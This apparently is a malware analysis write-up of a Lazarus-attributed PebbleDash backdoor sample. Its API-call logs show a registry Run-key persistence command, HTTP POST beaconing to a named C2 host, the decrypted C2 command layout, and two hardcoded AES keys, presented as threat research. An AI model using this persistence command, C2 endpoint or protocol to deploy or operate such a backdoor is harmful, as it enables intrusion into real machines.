---
title: "LAZARUS PebbleDash"
date: 2025-03-10
---

# Context

SHA256 : 875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24  
sample source : [bazar.abuse.ch](https://bazaar.abuse.ch/sample/875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24/)  
VT : [VirusTotal](https://www.virustotal.com/gui/file/875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24)  

Reports:  
<https://dmpdump.github.io/posts/Lazarus-Backdoor-ITLure/>  
<https://ti.qianxin.com/blog/articles/Kimsuky-Weapon-Update:-Analysis-of-Attack-Activity-Targeting-Korean-Region/>  


C2 :
http://www.addfriend.kr/board/userfiles/temp/index.html  

Analyzed sample is a 64bit PE PebbleDash sample attributed to LAZARUS  

As usual, results from dynamic analysis are shared in my repository ([logs](https://github.com/cedricg-mirror/reflexions/blob/main/APT/LAZARUS/PebbleDash/875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24/logs.txt))  




## Persistency  

In order to trigger the persistency-setup behavior from the sample a little reverse engineering was required :  

```html
[CNT] [13]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetCommandLineA> in [KERNEL32.DLL] 
[RET] 0x7ff7f099fd96 in [pebbledash.exe]

[CNT] [14]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetCommandLineW> in [KERNEL32.DLL] 
[RET] 0x7ff7f099fda3 in [pebbledash.exe]
```

Following the results from those call in statical analysis revealed the following :  

![Command Line Parsing](/docs/assets/images/PebbleDash/start.jpg)

The sample was therefore run with the '--start' parameter, which triggered its installation :  

```html
[CNT] [64]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <CreateProcessW> in [KERNEL32.DLL] 
[PAR] LPCWSTR               lpApplicationName   : 0x0 (null)
[PAR] LPCWSTR               lpCommandLine       : 0x00000025275BF1E0
[STR]                       -> "reg add hkcu\software\microsoft\windows\currentversion\run /d "\"C:\Users\user\Desktop\pebbledash\pebbledash.exe\"" /t R"
[STR]                          "EG_SZ /v "PAY" /f"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes  : 0x0
[PAR] BOOL                  bInheritHandles     : 0x0
[PAR] DWORD                 dwCreationFlags     : 0x0 
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCWSTR               lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x00000025275BE970
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x1 (STARTF_USESHOWWINDOW)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x0
[FLD]                       -> hStdError   = 0x0
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x00000025275BE950
[RET] 0x7ff7f0997314 in [pebbledash.exe]
```


## C2 connection

C2 connection is straightforward :  

```html
[CNT] [91]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpConnect> in [winhttp.dll] 
[PAR] HINTERNET     hSession       : 0x277edf80
[PAR] LPCWSTR       pswzServerName : 0x00000025275BD040
[STR]               -> "www.addfriend.kr"
[PAR] INTERNET_PORT nServerPort    : 80
[RET] 0x7ff7f0985d45 in [pebbledash.exe]

[CNT] [92]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpOpenRequest> in [winhttp.dll] 
[PAR] HINTERNET hConnect          : 0x277f0070
[PAR] LPCWSTR   pwszVerb          : 0x00000025275BD022
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x00000025275BD250
[STR]           -> "/board/userfiles/temp/index.html"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x0 
[RET] 0x7ff7f0985e41 in [pebbledash.exe]

[...]

[CNT] [103]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpWriteData> in [winhttp.dll] 
[PAR] HINTERNET hRequest                 : 0x00000025277F4080
[PAR] LPCVOID   lpBuffer                 : 0x00000025275BE180
[STR]           -> "sep=MltZfhPlOLa&uid=689b5bb9&sid=0101e418"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x29
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x00000025275BDE38
[RET] 0x7ff7f0986c47 in [pebbledash.exe]

[CNT] [104]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpReceiveResponse> in [winhttp.dll] 
[PAR] HINTERNET hRequest   : 0x00000025277F4080
[PAR] LPVOID    lpReserved : 0x0
[RET] 0x7ff7f0986daa in [pebbledash.exe]
```

As mention in a linked blog analysis from dmpdump.github, the "uid" parameter is set according to the result from :  

```html
[CNT] [81]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetVolumeInformationW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpRootPathName           : 0x00000025275BDCB0
[STR]         -> "C:\"
[PAR] LPWSTR  lpVolumeNameBuffer       : 0x0
[PAR] DWORD   nVolumeNameSize          : 0x0
[PAR] LPDWORD lpVolumeSerialNumber     : 0x00000025275BDCA8
[PAR] LPDWORD lpMaximumComponentLength : 0x0
[PAR] LPDWORD lpFileSystemFlags        : 0x0
[PAR] LPWSTR  lpFileSystemNameBuffer   : 0x0
[PAR] DWORD   nFileSystemNameSize      : 0x0
[RET] 0x7ff7f098ab33 in [pebbledash.exe]
```

---  

I'm still in the process of rewriting a basic C2 for this sample, so far I can share some dynamic analysis log for the following commands :  

1) Set Current Directory

```html
[CNT] [364]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpReadData> in [winhttp.dll] 
[PAR] HINTERNET hRequest              : 0xff3cd9c0
[PAR] LPVOID    lpBuffer              : 0x000000A2FF401B10
[PAR] DWORD     dwNumberOfBytesToRead : 0x46
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000A2FF19D33C
[RET] [0x7ff7a37d6fa4] [+0x6fa4] in [pebbledash.exe]

[ * ] [pid 0x22c][tid 0x664] c:\users\user\desktop\pebbledash\pebbledash.exe
[API] <WinHttpReadData>
[PAR] LPCVOID lpBuffer : 0x000000A2FF401B10
[STR]         -> "<html>59hmGTXPezZN8QoJ2v03xUJjESmUHo1Nw1M55KXGg0P+7KeqIKOzaj9m6H+aiUCf"
[RES] BOOL 0x1
```

After Base64Decode and AES Decrypt, the layout of the command is :  

```
00000000  03 00 00 00 00 00 00 00 43 00 3a 00 5c 00 55 00  |........C.:.\.U.|
00000010  73 00 65 00 72 00 73 00 5c 00 75 00 73 00 65 00  |s.e.r.s.\.u.s.e.|
00000020  72 00 00 00                                      |r...|
```

First 8 bytes is the command ID (0x3 for SetCurrentDirectory), then the parameter (the path to the new Current Directory)  

PebbleDash handles this command this way :  

```html
[CNT] [373]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <StrTrimW> in [SHLWAPI.dll] 
[PAR] PWSTR  psz          : 0x000000A2FF19D020
[STR]        -> "C:\Users\user"
[PAR] PCWSTR pszTrimChars : 0x00007FF7A3808054
[STR]        -> "\ "
[RET] [0x7ff7a37de70d] [+0xe70d] in [pebbledash.exe]

[CNT] [375]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <SetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpPathName : 0x000000A2FF19D020
[STR]         -> "C:\Users\user\"
[RET] [0x7ff7a37de826] [+0xe826] in [pebbledash.exe]

[CNT] [377]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] DWORD  nBufferLength : 0x400
[PAR] LPWSTR lpBuffer      : 0x000000A2FF19D020
[RET] [0x7ff7a37de8ab] [+0xe8ab] in [pebbledash.exe]

[CNT] [394]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpWriteData> in [winhttp.dll] 
[PAR] HINTERNET hRequest                 : 0x000000A2FF3CD9C0
[PAR] LPCVOID   lpBuffer                 : 0x000000A2FF41BCC0
[STR]           -> "sep=sRhqotvThSV&sid=013efbc9&data=RDMUOWovjIpPR5Erhn4rhFOn8dSttvdYfSrSJBryHVaAn09y8gL2iOBOckjVd4nr"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x62
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000A2FF19CC68
[RET] [0x7ff7a37d6c47] [+0x6c47] in [pebbledash.exe]

```

The data parameter is the feedback from the command execution :  

```
00000000  02 00 00 00 1c 00 00 00 43 00 3a 00 5c 00 55 00  |........C.:.\.U.|
00000010  73 00 65 00 72 00 73 00 5c 00 75 00 73 00 65 00  |s.e.r.s.\.u.s.e.|
00000020  72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |r...............|
```

First ULONG (0x2) is unknown yet, 2nd ULONG (0x1c) is the size of the following data, in this case the new Current Directory  



---  

## API Call

API call is achieved is most cases by going through the following pattern :  

![Dynamic API Address resolution](/docs/assets/images/PebbleDash/API_Call.jpg)

1) Required function name is hashed with Fowler–Noll–Vo hash function  
<https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function>  
The FNV_offset_basis is the 64-bit value: 0xcbf29ce484222325.  
The FNV_prime is the 64-bit value 0x100000001b3.  

2) Function address is dynamically retrieved by walking the PEB and looking for an exported function matching the given Hash  

3) Calling the function  

Few examples of hashed function names below :  

```
2cd62eda1e190cc8  
winhttp!WinHttpWriteData

bcfc93e92c75c701
WinHTTP!WinHttpReceiveResponse

200cc715113de71d  
KERNEL32!LocalAlloc

ddd409e63a9cb926
WinHTTP!WinHttpQueryDataAvailable

90fc86b9e2232aa9  
WinHTTP!WinHttpReadData

3cf811a64137c676
KERNEL32!LocalFree

ca455d40bfa3e279
WinHTTP!WinHttpCloseHandle
```

## Encryption

AES encryption is achieved by the following routine :  

![AES Encrypt](/docs/assets/images/PebbleDash/aes.jpg)

The AES key is unxored just before the call : "NjqaPmSWYpmkTJZn"  

Interestingly, another AES Key "aqjNWSmPkmpYnZJT" can also be used under circumstances that I have yet to understand  

 

---  



